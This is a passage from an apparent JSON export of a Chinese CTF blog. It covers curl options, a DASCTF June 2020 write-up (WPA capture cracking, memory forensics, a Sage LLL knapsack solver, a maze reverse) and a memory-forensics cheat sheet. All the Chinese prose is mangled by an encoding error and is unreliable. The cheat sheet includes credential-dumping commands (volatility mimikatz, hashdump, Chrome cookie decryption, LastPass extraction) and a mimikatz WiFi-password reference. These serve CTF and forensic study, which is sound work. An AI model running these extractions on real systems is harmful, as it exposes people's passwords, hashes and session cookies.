https://google.com?q=example&#x27; https://www.example.com ä¸Šé¢å‘½ä»¤é€šè¿‡ç›´æ¥æ·»åŠ æ ‡å¤´Refererï¼Œè¾¾åˆ°åŒæ ·æ•ˆæœã€‚ 1$ curl -H &#x27;Host: xxxx&#x27; https://www.example.com ä¸Šé¢å‘½ä»¤è®¾ç½®Hostç»•è¿‡ä¸»æœºå¤´æ£€æµ‹ï¼Œæ›¿ä»£æ›´æ”¹hostæ–‡ä»¶çš„ç¹çæ“ä½œã€‚ 1$ curl -H &#x27;Content-Type:application/json&#x27; https://www.example.com ä¸Šé¢å‘½ä»¤è®¾ç½®è¯·æ±‚å¤´Content-Typeï¼Œä»¥jsonæ ¼å¼å‘é€ã€‚ 1$ curl -H &#x27;Range: bytes=0-10&#x27; https://www.example.com ä¸Šé¢å‘½ä»¤è¯·æ±‚èµ„æºçš„éƒ¨åˆ†å†…å®¹ï¼ˆä¸åŒ…æ‹¬å“åº”å¤´çš„å¤§å°ï¼‰ï¼Œå•ä½æ˜¯byteï¼Œå³å­—èŠ‚ï¼Œä»0å¼€å§‹ã€‚ æ ¼å¼ï¼š Range: bytes=start-end å¦‚ï¼š Range: bytes=10- ï¼šç¬¬10ä¸ªå­—èŠ‚åˆ°æœ€åä¸€ä¸ªå­—èŠ‚ä¹‹é—´çš„æ•°æ® Range: bytes=40-100 ï¼šç¬¬40ä¸ªå­—èŠ‚åˆ°ç¬¬100ä¸ªå­—èŠ‚ä¹‹é—´çš„æ•°æ® -i -iå‚æ•°æ‰“å°å‡ºæœåŠ¡å™¨å›åº”çš„ HTTP æ ‡å¤´ã€‚ 1$ curl -i https://www.example.com ä¸Šé¢å‘½ä»¤æ”¶åˆ°æœåŠ¡å™¨å›åº”åï¼Œå…ˆè¾“å‡ºæœåŠ¡å™¨å›åº”çš„æ ‡å¤´ï¼Œç„¶åç©ºä¸€è¡Œï¼Œå†è¾“å‡ºç½‘é¡µçš„æºç ã€‚ -L -Lå‚æ•°ä¼šè®© HTTP è¯·æ±‚è·ŸéšæœåŠ¡å™¨çš„é‡å®šå‘ã€‚curl é»˜è®¤ä¸è·Ÿéšé‡å®šå‘ã€‚ 1$ curl -L -d &#x27;tweet=hi&#x27; https://api.twitter.com/tweet -o -oå‚æ•°å°†æœåŠ¡å™¨çš„å›åº”ä¿å­˜æˆæ–‡ä»¶ï¼Œç­‰åŒäºwgetå‘½ä»¤ã€‚ 1$ curl -o example.html https://www.example.com ä¸Šé¢å‘½ä»¤å°†www.example.comä¿å­˜æˆexample.htmlã€‚ -O -Oå‚æ•°å°†æœåŠ¡å™¨å›åº”ä¿å­˜æˆæ–‡ä»¶ï¼Œå¹¶å°† URL çš„æœ€åéƒ¨åˆ†å½“ä½œæ–‡ä»¶åã€‚ 1$ curl -O https://www.example.com/foo/bar.html ä¸Šé¢å‘½ä»¤å°†æœåŠ¡å™¨å›åº”ä¿å­˜æˆæ–‡ä»¶ï¼Œæ–‡ä»¶åä¸ºbar.htmlã€‚ -u -uå‚æ•°ç”¨æ¥è®¾ç½®æœåŠ¡å™¨è®¤è¯çš„ç”¨æˆ·åå’Œå¯†ç ã€‚ 1$ curl -u &#x27;bob:12345&#x27; https://google.com/login ä¸Šé¢å‘½ä»¤è®¾ç½®ç”¨æˆ·åä¸ºbobï¼Œå¯†ç ä¸º12345ï¼Œç„¶åå°†å…¶è½¬ä¸º HTTP æ ‡å¤´Authorization: Basic Ym9iOjEyMzQ1ã€‚ curl èƒ½å¤Ÿè¯†åˆ« URL é‡Œé¢çš„ç”¨æˆ·åå’Œå¯†ç ã€‚ 1$ curl https://bob:12345@google.com/login ä¸Šé¢å‘½ä»¤èƒ½å¤Ÿè¯†åˆ« URL é‡Œé¢çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå°†å…¶è½¬ä¸ºä¸Šä¸ªä¾‹å­é‡Œé¢çš„ HTTP æ ‡å¤´ã€‚ 1$ curl -u &#x27;bob&#x27; https://google.com/login ä¸Šé¢å‘½ä»¤åªè®¾ç½®äº†ç”¨æˆ·åï¼Œæ‰§è¡Œåï¼Œcurl ä¼šæç¤ºç”¨æˆ·è¾“å…¥å¯†ç ã€‚ -v -vå‚æ•°è¾“å‡ºé€šä¿¡çš„æ•´ä¸ªè¿‡ç¨‹ï¼Œç”¨äºè°ƒè¯•ã€‚ 1$ curl -v https://www.example.com -F æˆ– --form ä½¿ç”¨-F æˆ– --formæ¥ä¸Šä¼ æ–‡ä»¶ï¼Œè¿™æ ·ä¼šç»™è¯·æ±‚æ·»åŠ  enctype=&quot;multipart/form-data&quot; å‚æ•°ã€‚ 1$ curl -F &#x27;img_avatar=@/home/petehouston/hello.txt&#x27; http://localhost/upload æƒ³è¦åŒæ—¶ä¸Šä¼ å¤šä¸ªæ–‡ä»¶çš„è¯ï¼Œåªéœ€è¦æ·»åŠ å¤šä¸ª -F é€‰é¡¹å°±å¯ä»¥äº†ã€‚ 1$ curl -F &#x27;fileX=@/path/to/fileX&#x27; -F &#x27;fileY=@/path/to/fileY&#x27; ... http://localhost/upload æƒ³è¦ä¸Šä¼ æ–‡ä»¶æ•°ç»„çš„è¯ï¼Œåªéœ€è¦æ·»åŠ å¤šä¸ª -F é€‰é¡¹å¹¶å‘½åæˆç›¸åŒåå­—çš„æ•°ç»„å°±å¯ä»¥äº†ã€‚ 1$ curl -F &#x27;files[]=@/path/to/fileX&#x27; -F &#x27;files[]=@/path/to/fileY&#x27; ... http://localhost/upload -x -xå‚æ•°æŒ‡å®š HTTP è¯·æ±‚çš„ä»£ç†ã€‚ 1$ curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com ä¸Šé¢å‘½ä»¤æŒ‡å®š HTTP è¯·æ±‚é€šè¿‡myproxy.com:8080çš„ socks5 ä»£ç†å‘å‡ºã€‚ å¦‚æœæ²¡æœ‰æŒ‡å®šä»£ç†åè®®ï¼Œé»˜è®¤ä¸º HTTPã€‚ 1$ curl -x james:cats@myproxy.com:8080 https://www.example.com ä¸Šé¢å‘½ä»¤ä¸­ï¼Œè¯·æ±‚çš„ä»£ç†ä½¿ç”¨ HTTP åè®®ã€‚","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"å‘½ä»¤è¡Œ","slug":"å‘½ä»¤è¡Œ","permalink":"https://lazzzaro.github.io/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/"},{"name":"Linux","slug":"Linux","permalink":"https://lazzzaro.github.io/tags/Linux/"},{"name":"Bash","slug":"Bash","permalink":"https://lazzzaro.github.io/tags/Bash/"}],"author":"Lazzaro"},{"title":"DASCTF å…­æœˆå›¢é˜Ÿèµ›","slug":"match-DASCTF-å…­æœˆå›¢é˜Ÿèµ›","date":"2020-06-26T10:43:38.000Z","updated":"2020-06-27T02:39:25.461Z","comments":true,"path":"2020/06/26/match-DASCTF-å…­æœˆå›¢é˜Ÿèµ›/","permalink":"https://lazzzaro.github.io/2020/06/26/match-DASCTF-%E5%85%AD%E6%9C%88%E5%9B%A2%E9%98%9F%E8%B5%9B/","excerpt":"","text":"â€‹ æ²¡æœ‰webæ‰‹+pwnæ‰‹ä¼¤ä¸èµ·~~ â€‹ MISCPhysicalHacker æäº¤flagæ—¶è¯·æäº¤{}é‡Œé¢çš„ å·²çŸ¥æ•°æ®åŒ…æ–‡ä»¶DASCTF_June.capå’Œhint.txt ç”±hint.txtè„šæœ¬çŸ¥æŸä¸ªå¯†ç ä½¿ç”¨çš„å­—å…¸ä¸º00000000-99999999ï¼ˆ10ä¸ªå€¼ï¼‰ã€‚ Wiresharkæ‰“å¼€capæ–‡ä»¶ï¼Œå‘ç°é‡Œé¢åªæœ‰802.11 wireless LANåè®®æµé‡ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯WPAæˆ–WEPåŠ å¯†åçš„æ— çº¿æ•°æ®åŒ…ã€‚ Kaliä¸‹ä½¿ç”¨å·¥å…· aircrack-ng + airdecap-ng ç ´è§£ï¼š aircrack-ng DASCTF_June.cap æŸ¥çœ‹ESSIDä¿¡æ¯ aircrack-ng DASCTF_June.cap -w password.txt ç”¨ä¸Šé¢çš„å­—å…¸çˆ†ç ´å¯†ç  å¾—åˆ°å¯†ç  66666666ï¼Œç”¨ESSIDå’Œå¯†ç è§£å¯†æµé‡åŒ… airdecap-ng DASCTF_June.cap -e DASCTF -p 66666666 å¾—åˆ°æ–°æµé‡åŒ…ï¼Œæ‰“å¼€æŸ¥çœ‹TCPæ•°æ®åŒ…ï¼Œåœ¨ä¸€ä¸ªåŒ…ä¸­æ‰¾åˆ°zipæ–‡ä»¶æ•°æ®ï¼Œå¯¼å‡ºè§£å‹å¾—åˆ°flag.txtã€‚ åªæœ‰ä¸€å¥è¯â€œWelcome to DASCTF June, Flag is here but you will never find it noob hacker!â€ ä½†Ctrl+Aå…¨é€‰å‘ç°ä¸‹æ–¹æœ‰å¤§é‡ç©ºç™½ä¸å¯è§å­—ç¬¦ï¼ŒçŒœæµ‹ä¸ºsnowéšå†™ï¼Œ ä½¿ç”¨snowéšå†™å·¥å…·è§£å¯†ï¼š snow.exe -d flag.txt å¾—åˆ°å­—ç¬¦ä¸²base32è§£ç å³å¯ã€‚ â€‹ BaiduYun&amp;Gcode ä½ äº†è§£ç™¾åº¦ç½‘ç›˜çš„ç§’ä¼ åŸç†ä¹ˆï¼Ÿ hint:æ•°æ®åº“ä¸­çš„xshadow.pngä¸å¹³å°é¦–é¡µä¸­xshadow.pngçš„å‰256KBç›¸åŒ å·²çŸ¥ä¸€ä»½ç™¾åº¦äº‘ç›˜çš„ç”¨æˆ·æ•°æ®æ–‡ä»¶å¤¹usersã€‚è¿™é¢˜å‡ºå¾—ä¸é”™ï¼Œäº†è§£ç™¾åº¦ç½‘ç›˜çš„ç§’ä¼ åŸç†ã€‚ ç§’ä¼ åŸç†ï¼šé€šè¿‡æ£€æµ‹æ–‡ä»¶å¤§å°å’Œmd5å€¼ï¼Œæˆ–è€…å†åŠ ä¸Šå…¶ä»–å¦‚æ–‡ä»¶å‰256KBåˆ‡ç‰‡çš„md5å€¼çš„ä¿¡æ¯ï¼Œè‹¥äº‘ç«¯æœ‰ç›¸åŒçš„æ–‡ä»¶ï¼Œåˆ™ç›´æ¥è¿›è¡Œäº‘ç«¯æ‹·è´ã€‚ å‚è€ƒï¼š åˆ©ç”¨BaiduPCS-Goæ‰¹é‡ç§’ä¼ ä¸å¤‡ä»½ https://github.com/felixonmars/BaiduPCS-Go ä¸‹è½½BaiduPCS-Goå·¥å…·ï¼ŒéªŒè¯è‡ªå·±çš„ç™¾åº¦äº‘è´¦å·å¯†ç ç™»å½•ã€‚ ä»usersæå– BaiduYunCacheFileV0.db ä¸­çš„æ•°æ®åº“ä¿¡æ¯ï¼Œç”¨SQLite ExpertæŸ¥çœ‹å™¨æ‰“å¼€dbæ–‡ä»¶ï¼Œæ‰¾åˆ°cacheæ•°æ®è®°å½•ï¼š ç”±æç¤ºè‚¯å®šæ˜¯å’Œxshadow.pngæœ‰å…³äº†ï¼Œç”¨BaiduPCS-Goå·¥å…·é‡Œçš„æ‰‹åŠ¨ç§’ä¼ åŠŸèƒ½ BaiduPCS-Go ru -length=&lt;æ–‡ä»¶çš„å¤§å°&gt; -md5=&lt;æ–‡ä»¶çš„md5å€¼&gt; -slicemd5=&lt;æ–‡ä»¶å‰256KBåˆ‡ç‰‡çš„md5å€¼(å¯é€‰)&gt; -crc32=&lt;æ–‡ä»¶çš„crc32å€¼(å¯é€‰)&gt; &lt;ä¿å­˜çš„ç½‘ç›˜è·¯å¾„, éœ€åŒ…å«æ–‡ä»¶å&gt; æ”¾å…¥å¾—åˆ°çš„xshadow.pngä¿¡æ¯ï¼š BaiduPCS-Go ru -length=30038207 -md5=72b6273dc5c54e8af2490e4acd3a6a3f /temp å‘ç°è¿è¡Œä¸æˆåŠŸï¼Œéœ€è¦slicemd5å€¼ï¼Œé‚£ä¹ˆéœ€è¦ xshadow.png çš„å‰256KBåˆ‡ç‰‡çš„md5äº†ã€‚ æ ¹æ®æç¤ºï¼Œåœ¨é¦–é¡µæ‰¾åˆ° https://www.linkedbyx.com/static/xshadow.png ä¸‹è½½ï¼Œkaliä¸‹å–å‰256KBåˆ‡ç‰‡ã€‚ split -b 256K xshadow.png ç”Ÿæˆæ–‡ä»¶xaa md5sum xaa æ±‚åˆ‡ç‰‡md5å€¼ é‡æ–°è¿è¡Œå‘½ä»¤ï¼š BaiduPCS-Go ru -length=30038207 -md5=72b6273dc5c54e8af2490e4acd3a6a3f -slicemd5=e973409c4ac718e158be4492ab5d9999 /temp æˆåŠŸåœ¨ç™¾åº¦ç½‘ç›˜å¾—åˆ°äº‘ä¸Šçš„xshadow.pngæ–‡ä»¶ã€‚ ä¸‹è½½ï¼Œç”¨binwalkæå–å‡ºzipæ–‡ä»¶ï¼Œè§£å‹å¾—åˆ°flag.gcodeã€‚ äº†è§£åˆ°gcodeæ–‡ä»¶ä¸º3Dæ¨¡å‹åˆ‡ç‰‡è½¯ä»¶è¾“å‡ºçš„æ–‡ä»¶ç±»å‹ï¼Œå¯ä»¥ç”¨ä¸‹é¢ä¸‰ä¸ªä»»æ„ä¸€ä¸ªç½‘é¡µåœ¨çº¿é¢„è§ˆï¼š http://gcode.ws/https://ncviewer.com/http://jherrm.com/gcode-viewer/ è¯•äº†å¾ˆå¤šæ¬¡åœ¨çº¿åŠ è½½ï¼ŒæŒ‚ç€ä¸¤ä¸ªè™šæ‹Ÿæœºï¼Œ300w+è¡Œä»£ç ï¼Œæ‰“å¼€åˆ°ä¸€åŠç›´æ¥å†…å­˜ä¸è¶³ç½‘é¡µå´©æºƒï¼Œæ±‚åŠ©64Gå¤§å†…å­˜ç¥æœºå¤§ä½¬ï¼Œåœ¨çº¿ç»˜åˆ¶å¾—åˆ° æƒ³åˆ°æ˜¯3Dç»˜åˆ¶ï¼Œå°è¯•æ—‹è½¬å„è§†è§’ï¼Œåœ¨ä¾§é¢å‘ç°ç„æœºï¼Œè°ƒæ•´å¥½è§’åº¦è®°å½•æœ€ç»ˆflagã€‚ è†œå‡ºé¢˜å¤§ä½¬~~ â€‹ Keyboard I hid the flag. Go find it å·²çŸ¥æ–‡ä»¶Keyboard.rawå’ŒSecretï¼Œè²Œä¼¼æ˜¯4æœˆèµ›åŸé¢˜ã€‚ å†…å­˜å–è¯ï¼š volatility -f Keyboard.raw imageinfo å¾—åˆ°profileä¿¡æ¯ Win7SP1x64ï¼Œ volatility -f Keyboard.raw --profile=Win7SP1x64 pslist å‘ç°å¯ç–‘è¿›ç¨‹ keyboard-log.exe å’Œ VeraCrypt.exeï¼Œåˆ†åˆ«æ˜¯é”®ç›˜è®°å½•å™¨å’ŒåŠ å¯†å™¨ï¼Œ æœç´¢ keyboard-log ç›¸å…³æ–‡ä»¶ volatility -f Keyboard.raw --profile=Win7SP1x64 filescan | grep keyboard dumpå¯¼å‡ºå¯ç–‘ t.txt æ–‡ä»¶ã€‚ CTKQEKNHZHQLLVGKROLATNWGQKRRKQGWNTA åƒæ˜¯å¯†ç çš„å¯†æ–‡ï¼ŒåŠ å¯†æ–¹æ³•æ˜¯ä¸Šé¢çš„ CTFWIKI-CRYPTO-ABCï¼Œ çŒœæµ‹QWERTYé”®ç›˜å¯†ç ï¼Œè„šæœ¬è¿˜åŸå¾—VERACRYPTPASSWORDISKEYBOARDDRAOBYEKã€‚ ç”¨VeraCryptæŒ‚è½½åŠ å¯†åˆ†åŒºæ–‡ä»¶Secretï¼Œå¾—åˆ°ä¸€ä¸ªvhdè™šæ‹Ÿç£ç›˜æ–‡ä»¶ï¼Œå†æŒ‚è½½å¾—åˆ°flag.txtï¼Œæ‰“å¼€å‘ç°ä¸ºå‡flagï¼Œ NTFSéšå†™å·¥å…·æœä¸€æœï¼Œå¾—åˆ°æ­£ç¡®flagã€‚ â€‹ é€æ˜åº¦ ä½ çŸ¥é“RGBAå—ï¼Ÿ å·²çŸ¥ä¸€å¼ pngå›¾ï¼Œé¢˜é¢RGBAæç¤ºLSBéšå†™ï¼Œç”¨zstegå·¥å…·æŸ¥çœ‹ï¼š zsteg -a Rgba.png å‘ç° b8,a,lsb,xy åŒºåŸŸæœ‰zipæ–‡ä»¶ï¼Œå¯¼å‡ºå†…å®¹ï¼š zsteg -E &quot;b8,a,lsb,xy&quot; Rgba.png &gt; out.zip zipå†…txtæ–‡ä»¶åæç¤ºå¯†ç æ˜¯ nep?? åœ¨ARCHPRä¸­è®¾ç½®æ©ç çˆ†ç ´å¾—zipå¯†ç ä¸ºï¼šnepnbï¼Œè§£å‹å¾—flagã€‚ â€‹ CRYPTOGemini_Man è²Œä¼¼Nå¾ˆå¤§å™¢ï¼Œè€å¿ƒç‚¹æ€»èƒ½è§£å‡ºæ¥ å·²çŸ¥å¾ˆå¤§çš„ $C$ å’Œ $N$ï¼Œæ— æ³•ç”¨å¸¸è§„æ–¹æ³•åˆ†è§£ï¼Œç”±å¼€å±€çš„æç¤ºâ€å­ªç”Ÿç´ æ•°â€œæˆ–é¢˜ç›®â€Gemini_Manâ€œï¼ŒçŒœæµ‹ $q=p+2$ã€‚ ä»£å…¥ $pq=N$ï¼Œè§£ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹å¾—åˆ°æ­£ç¡® $p,q$ å€¼ã€‚ é¢˜ç›®æœªç»™ $e$ ï¼ŒçŒœæµ‹ä¸ºå¸¸è§çš„ $e=65537$ ï¼Œå¸¸è§„è„šæœ¬æ”¾åˆ°Kaliç¯å¢ƒè·‘å‡ºæ˜æ–‡ $m$ã€‚ ï¼ˆæœªçŸ¥åŸå› Windowsç¯å¢ƒä¸‹ pow(C,d,N) æ­»æ´»è·‘ä¸å‡ºï¼‰ â€‹ HardKnapsack1 HardKnapsack1 æ±‚è§£èƒŒåŒ…åŠ å¯†ï¼Œåœ¨Sageä¸­é‡‡ç”¨LLLç®—æ³•ç°æˆè„šæœ¬è·‘å‡ºç»“æœï¼š 1234567891011121314151617181920212223242526272829303132333435###Sage###import binascii# open the public key and strip the spaces so we have a decent arrayfileKey = open(&quot;pub.Key&quot;, &#x27;rb&#x27;)pubKey = fileKey.read().replace(&#x27; &#x27;, &#x27;&#x27;).replace(&#x27;L&#x27;, &#x27;&#x27;).strip(&#x27;[]&#x27;).split(&#x27;,&#x27;)nbit = len(pubKey)# open the encoded messagefileEnc = open(&quot;enc.txt&quot;, &#x27;rb&#x27;)encoded = fileEnc.read().replace(&#x27;L&#x27;, &#x27;&#x27;)print(&quot;start&quot;)# create a large matrix of 0&#x27;s (dimensions are public key length +1)A = Matrix(ZZ, nbit + 1, nbit + 1)# fill in the identity matrixfor i in range(nbit): A[i, i] = 1# replace the bottom row with your public keyfor i in range(nbit): A[i, nbit] = pubKey[i]# last element is the encoded messageA[nbit, nbit] = -int(encoded)res = A.LLL()for i in range(0, nbit + 1): # print solution M = res.row(i).list() flag = True for m in M: if m != 0 and m != 1: flag = False break if flag: M = &#x27;&#x27;.join(str(j) for j in M) # remove the last bit M = M[:-1] print(M) PSï¼šå¸¦çº¦æŸæ¡ä»¶çš„HardKnapsack2ç”¨LLLè·‘ä¸å‡ºç»“æœï¼Œå¾…å­¦ä¹ ã€‚ â€‹ REVERSEeasy_maze èµ°å‡ºæ¥ä¾¿æ˜¯è‹±é›„ï¼ps:å°†å¾—åˆ°çš„å­—ç¬¦ä¸²md5åŠ å¯†æäº¤ è¿·å®«é¢˜ï¼ŒIDAæŸ¥çœ‹å­—ç¬¦ä¸²å‘ç°è¿·å®«é˜µå­—ç¬¦ä¸²ï¼š OOOO0000#000OO0OOOOOO0OO0000OO00OOOOO0OO0OOOO000OO00OO00OOOOO0OO0OOOOOO0000OOOOOOOOOOOOOOOOOOOOOOOO ç»“åˆmainå‡½æ•°ä¼ªä»£ç æ˜“çŸ¥ä¸Šä¸‹å·¦å³æ§åˆ¶é”®å¯¹åº”ujhkï¼Œä¸”è¿·å®«å¤§å°ä¸º10Ã—10ï¼Œ#ä¸ºç»ˆç‚¹ï¼Œ0ä¸ºè·¯å¾„ï¼ŒXï¼ˆå®é™…ä¸ºç©ºï¼‰ä¸ºèµ·ç‚¹ï¼Œè°ƒæ•´ä¸ºï¼š XOOOO0000# 000OO0OOOO OO0OO0000O O00OOOOO0O O0OOOO000O O00OO00OOO OO0OO0OOOO OO0000OOOO OOOOOOOOOO OOOOOOOOOO å¾—åˆ°è·¯å¾„å­—ç¬¦ä¸²ï¼šjkkjjhjjkjjkkkuukukkuuhhhuukkkkï¼Œmd5åŠ å¯†æäº¤ã€‚","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020èµ›","slug":"2020èµ›","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"å–è¯","slug":"misc-å–è¯","date":"2020-06-19T17:48:32.000Z","updated":"2023-10-25T17:46:49.833Z","comments":true,"path":"2020/06/20/misc-å–è¯/","permalink":"https://lazzzaro.github.io/2020/06/20/misc-%E5%8F%96%E8%AF%81/","excerpt":"","text":"å–è¯ï¼ˆForensicï¼‰å†…å­˜å–è¯å·¥å…·ï¼švolatilityï¼ŒDiskGenius volatilityhttps://github.com/volatilityfoundation/volatility é•œåƒåŸºæœ¬ä¿¡æ¯ï¼ˆå¾—åˆ°profileï¼‰ï¼š volatility -f mem.data imageinfo python3 vol.py -f mem.data windows.info æœç´¢è¿›ç¨‹ã€å¯¼å‡ºå†…å­˜å—ï¼š volatility -f mem.data --profile=XXX pslist python3 vol.py -f mem.data windows.pstree volatility -f mem.data --profile=XXX memdump -p 2768 -D ./ æŸ¥çœ‹å‘½ä»¤è¡Œè¾“å…¥ã€å‘½ä»¤è¡Œå†å²è®°å½•ï¼š volatility -f mem.data --profile=XXX cmdline python3 vol.py -f mem.data windows.cmdline volatility -f mem.data --profile=XXX cmdscan volatility -f mem.data --profile=XXX consoles æŸ¥çœ‹å¯ç–‘æ–‡ä»¶ã€å¯¼å‡ºæ–‡ä»¶ï¼š volatility -f mem.data --profile=XXX filescan | grep -E &quot;.zip|.rar|.jpg|.png|.txt|.bmp|.7z&quot; volatility -f mem.data --profile=XXX dumpfiles -D ./ -Q 0x000000001e85f430 -n python3 vol.py -f mem.data windows.dumpfiles --pid 8180 python3 vol.py -f mem.data windows.dumpfiles --virtaddr 0xd0064181c950 ç‰¹æ®Šæ–‡ä»¶åç¼€ï¼š evtx - Windowsç³»ç»Ÿæ—¥å¿— æ— æ³•å¯¼å‡º.datæ–‡ä»¶ï¼ŒåŠ  -u å‚æ•°ï¼ˆ-u = â€”unsafe relax safety constraints more dataï¼‰volatility -f mem.data dumpfiles -r pdf$ -i --name -D dumpfiles/ -u dumpfiles å‚æ•°ï¼šå‚è€ƒï¼šhttps://www.andreafortuna.org/2017/07/17/volatility-my-own-cheatsheet-part-4-kernel-memory-and-objects12345678910111213141516-r REGEX, --regex=REGEX Dump files matching REGEX-i, --ignore-case Ignore case in pattern match-o OFFSET, --offset=OFFSET Dump files for Process with physical address OFFSET-Q PHYSOFFSET, --physoffset=PHYSOFFSET Dump File Object at physical address PHYSOFFSET-D DUMP_DIR, --dump-dir=DUMP_DIR Directory in which to dump extracted files-S SUMMARY_FILE, --summary-file=SUMMARY_FILE File where to store summary information-p PID, --pid=PID Operate on these Process IDs (comma-separated)-n, --name Include extracted filename in output file path-u, --unsafe Relax safety constraints for more data-F FILTER, --filter=FILTER Filters to apply (comma-separated) æŸ¥çœ‹å†…å­˜ä¸­è®°å½•çš„å½“æ—¶æ­£åœ¨è¿è¡Œçš„ç¨‹åºã€è¿è¡Œæ¬¡æ•°ã€æœ€åè¿è¡Œæ—¶é—´ï¼š volatility -f mem.data --profile=XXX userassist æŸ¥çœ‹æˆªå›¾ï¼š volatility -f mem.data --profile=XXX screenshot -D ./ æŸ¥çœ‹å‰ªè´´æ¿ï¼š volatility -f mem.data --profile=XXX clipboard volatility -f mem.data --profile=XXX clipboard -v æŸ¥çœ‹Editç¼–è¾‘æ§ä»¶ä¿¡æ¯ï¼š volatility -f mem.data --profile=XXX editbox æŸ¥çœ‹å½“å‰notepadæ–‡æœ¬ï¼š volatility -f mem.data --profile=XXX notepad æŸ¥çœ‹è´¦æˆ·ä¸å¯†ç ï¼š volatility --plugins=plugins/ -f mem.data --profile=XXX mimikatz æŸ¥çœ‹ç³»ç»Ÿç”¨æˆ·åï¼š volatility -f mem.data --profile=XXX printkey -K &quot;SAM\\Domains\\Account\\Users\\Names&quot; æŸ¥çœ‹æœ€åç™»å½•ç³»ç»Ÿçš„è´¦æˆ·ï¼š volatility -f mem.data --profile=xxx printkey -K &quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot; æŸ¥çœ‹ç½‘ç»œè¿æ¥ï¼š volatility -f mem.data --profile=XXX netscan æŸ¥çœ‹ç¼“å­˜åœ¨å†…å­˜ä¸­çš„æ³¨å†Œè¡¨ï¼š volatility -f mem.data --profile=XXX hivelist æå–æ³¨å†Œè¡¨ï¼š volatility -f mem.data --profile=XXX dumpregistry ï¼ˆdumpregistryæ’ä»¶ï¼‰ æå–æ³¨å†Œè¡¨systemå’ŒSAMè™šæ‹Ÿåœ°å€çš„hashå†…å®¹ï¼š volatility -f mem.data --profile=XXX hashdump volatility -f mem.data --profile=XXX hashdump -y 0xfffff8a000024010 -s 0xfffff8a00167a010 -D ./ python3 vol.py -f mem.data windows.hashdump æå–å†…å­˜ä¸­ä¸»æ–‡ä»¶è¡¨ï¼ˆMFTï¼‰è®°å½•ä¿¡æ¯ï¼ˆæ–‡ä»¶å±æ€§ï¼‰ï¼š volatility -f mem.data --profile=XXX mftparser &gt; mft.txt æå–IEå†å²è®°å½•ï¼š volatility -f mem.data --profile=XXX iehistory æ˜¾ç¤ºç¯å¢ƒå˜é‡ï¼š volatility -f mem.data --profile=XXX envars python3 vol.py -f mem.data windows.envars æå–Chromeå†å²è®°å½•ï¼ˆæ’ä»¶ï¼‰ï¼š Chrome Cookies çš„æœ¬è´¨æ˜¯ SQLiteã€‚ Chrome 80 ä»¥åæ›´æ”¹äº† Cookies çš„åŠ å¯†æ–¹æ³•ã€‚ cookies è¡¨ encrypted_value å­—æ®µä¸ä¸º V10 / V11 å¼€å¤´ï¼Œæ˜¯ Chrome 79 åŠä»¥å‰ç‰ˆæœ¬çš„ Cookiesã€‚ volatility --plugins=plugins/ -f mem.data chromehistory volatility --plugins=plugins/ -f mem.data chromevisits -Qï¼ˆvisits â€“ QUICKï¼‰ volatility --plugins=plugins/ -f mem.data chromevisitsï¼ˆvisits â€“ FULLï¼‰ volatility --plugins=plugins/ -f mem.data chromesearchterms volatility --plugins=plugins/ -f mem.data chromedownloadsï¼ˆStandard Text Outputï¼‰ volatility --plugins=plugins/ -f mem.data chromedownloads --output=csvï¼ˆCSV Outputï¼‰ volatility --plugins=plugins/ -f mem.data chromedownloads --output=bodyï¼ˆBodyfile Outputï¼‰ volatility --plugins=plugins/ -f mem.data chromedownloadchains volatility --plugins=plugins/ -f mem.data chromecookies | moreï¼ˆCookies â€“ Basic exampleï¼‰ volatility --plugins=plugins/ -f mem.data chromecookiesï¼ˆCookies â€“ No Decryptionï¼‰ volatility --plugins=plugins/ -f mem.data chromecookies -K &quot;rq2uadV+VvAD+IBiBeJ75a==&quot;ï¼ˆCookies â€“ Decryptedï¼‰ æå–ç™»å½•å¯†ç ï¼ˆLassPassæ’ä»¶ï¼‰ï¼š volatility --plugins=plugins/ -f mem.data --profile=XXX lasspass USBè®¾å¤‡ç›¸å…³ï¼ˆusbstoræ’ä»¶ï¼‰ï¼š volatility --plugins=plugins/ -f mem.data --profile=XXX usbstor ç‰¹æ®Šè¿›ç¨‹ ä¾¿ç­¾ï¼šStikyNot.exe ï¼ˆ.snt æ–‡ä»¶ï¼Œå¯¹åº”è·¯å¾„ï¼šC:\\Users\\XXX\\AppData\\Roaming\\Microsoft\\Sticky Notes\\ï¼‰ è”ç³»äººï¼šwab.exe ï¼ˆ.contact æ–‡ä»¶ï¼‰ æ’ä»¶æ”¶é›† https://github.com/superponible/volatility-pluginsï¼ˆchromehistoryï¼‰ https://github.com/kevthehermit/volatility_pluginsï¼ˆusbstorï¼‰ å‚è€ƒ https://wiki.wgpsec.org/knowledge/ctf/Volatility.html â€‹ ç£ç›˜å–è¯vmdkAccessData FTK Imager æŒ‚è½½ Bitlocker ç£ç›˜+å†…å­˜ Elcomsoft Forensic Disk Decryptor volumeé€‰æ‹©æŒ‚è½½è¿‡çš„ç‰©ç†ç£ç›˜ï¼Œmemory dumpé€‰æ‹©å†…å­˜æ–‡ä»¶ï¼Œä¸€ç›´å¾€åè§£å¯†ã€‚ â€‹ ç¤¾å·¥ï¼ˆä¿¡æ¯æ”¶é›†ï¼‰ ç”¨æˆ·å https://github.com/sherlock-project/sherlock Sherlock Projectæä¾›äº†ä¸€ä¸ªéå¸¸å¼ºå¤§çš„å‘½ä»¤è¡Œå·¥å…·Sherlockæ¥æŸ¥æ‰¾ç¤¾äº¤ç½‘ç»œï¼ˆç¤¾äº¤ç½‘ç»œåˆ—è¡¨åŠè§„åˆ™å¯è‡ªå®šä¹‰æ‰©å±•å»¶ä¼¸ï¼‰ä¸­çš„ç”¨æˆ·åï¼Œä»¥æ–¹ä¾¿æ‚¨è¿›è¡Œä¿¡æ¯æ”¶é›†ç›¸å…³çš„å®‰å…¨ä¿éšœå·¥ä½œã€‚ å‘½ä»¤ï¼špython3 sherlock.py user1 user2 user3 â€‹ WiFiå‚è€ƒï¼šHow to decrypt stored Windows passwords using mimikatz and DAPA å·¥å…·ï¼šmimikatz 